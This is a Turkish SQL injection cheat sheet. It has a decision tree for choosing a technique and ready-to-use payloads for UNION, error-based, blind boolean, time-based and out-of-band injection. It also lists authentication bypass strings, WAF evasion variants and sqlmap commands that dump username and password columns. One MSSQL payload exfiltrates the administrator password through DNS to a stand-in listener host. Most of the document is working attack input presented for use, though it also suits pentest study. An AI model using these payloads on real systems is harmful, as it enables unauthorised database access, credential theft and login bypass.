# SQL Injection

```markdown
# SQL Injection Teknik Seçim Rehberi

Hangi tekniği kullanman gerektiği, uygulamanın **ne gösterdiğine** bağlı.
Aşağıdaki sırayla kontrol et — her adımda "evet" aldığın ilk teknik, senin
tekniğin.

```
Sorgu sonucu sayfada görünüyor mu?
├── EVET → UNION-based
└── HAYIR
    └── Veritabanı hatası (verbose) görünüyor mu?
        ├── EVET → Error-based (verbose)
        └── HAYIR
            └── Sayfa davranışı koşula göre değişiyor mu?
                ├── EVET (içerik farkı)   → Boolean-based Blind
                ├── EVET (sadece hata/hata yok) → Conditional Error-based
                └── HAYIR
                    └── Yanıt süresi koşula göre değişiyor mu?
                        ├── EVET → Time-based Blind
                        └── HAYIR → Out-of-Band (OAST)
```

---

## 1. UNION-based
**Belirti:** Sorgu sonucu doğrudan sayfada görünüyor.
```sql
' ORDER BY 1--
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--
```

## Error-based (Verbose)
**Belirti:** Ayrıntılı veritabanı hatası sayfada görünüyor, hata metninin
içine veri gömülebiliyor.
```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--          -- MSSQL/PostgreSQL
' AND extractvalue(1,concat(0x7e,(SELECT version())))--              -- MySQL
```

## Conditional Error-based
**Belirti:** Verbose hata yok ama hata olup olmamasına göre sayfa
davranışı (ör. 500 sayfası) değişiyor.
```sql
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a           -- genel (MSSQL/PostgreSQL)
xyz' AND (SELECT CASE WHEN (SUBSTRING(Password,1,1)>'m') THEN 1/0 ELSE 'a' END FROM Users WHERE Username='Administrator')='a
```

## Boolean-based Blind
**Belirti:** Hata yok, ama koşula göre sayfa içeriği/mesajı değişiyor
(ör. "Welcome back" var/yok).
```sql
xyz' AND '1'='1
xyz' AND '1'='2
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1)>'m
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1)='s
```

## Time-based Blind
**Belirti:** Hiçbir görünür fark yok, sadece yanıt süresi koşula göre
değişiyor.
```sql
'; IF (1=1) WAITFOR DELAY '0:0:10'--                                  -- MSSQL
' AND SLEEP(5)--                                                      -- MySQL
' AND (SELECT pg_sleep(5))--                                          -- PostgreSQL
'; IF (SELECT COUNT(Username) FROM Users WHERE Username='Administrator' AND SUBSTRING(Password,1,1)>'m')=1 WAITFOR DELAY '0:0:5'--
```

## Out-of-Band (OAST)
**Belirti:** Hiçbir kanalda (içerik/hata/süre) fark yok — sorgu asenkron
çalışıyor.

| DB | Tetikleme fonksiyonu |
|---|---|
| MSSQL | `xp_dirtree`, `xp_fileexist` |
| Oracle | `UTL_HTTP.REQUEST`, `UTL_INADDR.GET_HOST_ADDRESS` |
| PostgreSQL | `dblink` uzantısı |
| MySQL | `LOAD_FILE()` (UNC yol) — en az güvenilir |

```sql
'; exec master..xp_dirtree '//abcdefg.dinleme-sunucusu.com/a'--       -- MSSQL, tetikleme
'; declare @p varchar(1024);
   set @p=(SELECT password FROM users WHERE username='administrator');
   exec('master..xp_dirtree "//'+@p+'.dinleme-sunucusu.com/a"')--     -- MSSQL, veri sızdırma
```
**Dinleme sunucusu:** Burp Collaborator · interactsh (ücretsiz/açık kaynak) · dnslog.cn

---

## Hızlı Karşılaştırma

| Teknik | Sinyal kanalı | Veri tek seferde mi çıkar? | Hız |
|---|---|---|---|
| UNION-based | Sayfa içeriği | Evet | Hızlı |
| Error-based (verbose) | Hata metni | Evet | Hızlı |
| Conditional error-based | Hata var/yok | Hayır, karakter karakter | Yavaş |
| Boolean-based blind | İçerik farkı | Hayır, karakter karakter | Yavaş |
| Time-based blind | Yanıt süresi | Hayır, karakter karakter | Çok yavaş |
| Out-of-band | Ayrı ağ kanalı | Evet | Hızlı (ama altyapı gerekir) |

**Kilit çıkarım:** İlk iki teknik (union/verbose error) veriyi *tek seferde*
okur. Sonraki üçü (conditional error/boolean/time) aynı algoritmayı
(doğru/yanlış sor, karakter karakter çıkar) farklı sinyal kanallarıyla
uygular — bu yüzden elle son derece yavaştır, doğrulandıktan sonra
`sqlmap`'e devret. OOB ise hem hızlı hem güvenilir ama ayrı bir dinleme
sunucusu gerektirir.

### Sütun Tipini Doğrulama (hangi sütun string kabul ediyor)
```sql
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
```

## Veritabanı Bilgisi
```sql
' UNION SELECT @@version,NULL--          -- MySQL/MSSQL
' UNION SELECT version(),NULL--          -- PostgreSQL
' UNION SELECT current_database(),NULL-- -- PostgreSQL
' UNION SELECT database(),NULL--         -- MySQL
' UNION SELECT current_user,NULL--
```

## Tablo/Sütun İsimlerini Çekme
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--   -- MySQL
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--      -- PostgreSQL
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

## Veri Çekme
```sql
' UNION SELECT username, password FROM users--
' UNION SELECT username || ':' || password, NULL FROM users--          -- PostgreSQL concat
' UNION SELECT CONCAT(username,':',password), NULL FROM users--        -- MySQL concat
' UNION SELECT GROUP_CONCAT(username,':',password), NULL FROM users--  -- MySQL, tüm satırlar tek hücrede
' UNION SELECT string_agg(username||':'||password, ','), NULL FROM users--  -- PostgreSQL, tüm satırlar tek hücrede
```

## Kimlik Doğrulama Bypass
```sql
admin'--
admin' #
admin'/*
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR 1=1--
```

## WAF / Filtre Atlatma
```sql
/*!UNION*/ /*!SELECT*/ NULL,NULL--     -- MySQL inline comment ile
UNI/**/ON SEL/**/ECT NULL,NULL--       -- anahtar kelime arasına yorum
' UnIoN SeLeCt NULL,NULL--             -- case değiştirme
' UNION%0aSELECT NULL,NULL--           -- boşluk yerine newline
%27 OR 1=1--                           -- URL encode tek tırnak
```

## Veritabanına Özel Hızlı Referans
| İşlem | MySQL | PostgreSQL | MSSQL |
|---|---|---|---|
| Versiyon | `@@version` | `version()` | `@@version` |
| Mevcut DB | `database()` | `current_database()` | `DB_NAME()` |
| String birleştirme | `CONCAT(a,b)` | `a \|\| b` | `a + b` |
| Yorum satırı | `-- ` / `#` | `-- ` | `-- ` |
| Gecikme fonksiyonu | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` |

## sqlmap Hızlı Komutlar
```bash
sqlmap -u "https://hedef.com/urun?id=1" --batch
sqlmap -u "https://hedef.com/urun?id=1" --dbs
sqlmap -u "https://hedef.com/urun?id=1" -D veritabani --tables
sqlmap -u "https://hedef.com/urun?id=1" -D veritabani -T users --columns
sqlmap -u "https://hedef.com/urun?id=1" -D veritabani -T users -C username,password --dump
sqlmap -r request.txt --batch    # Burp'ten kaydedilmiş request dosyasıyla
```
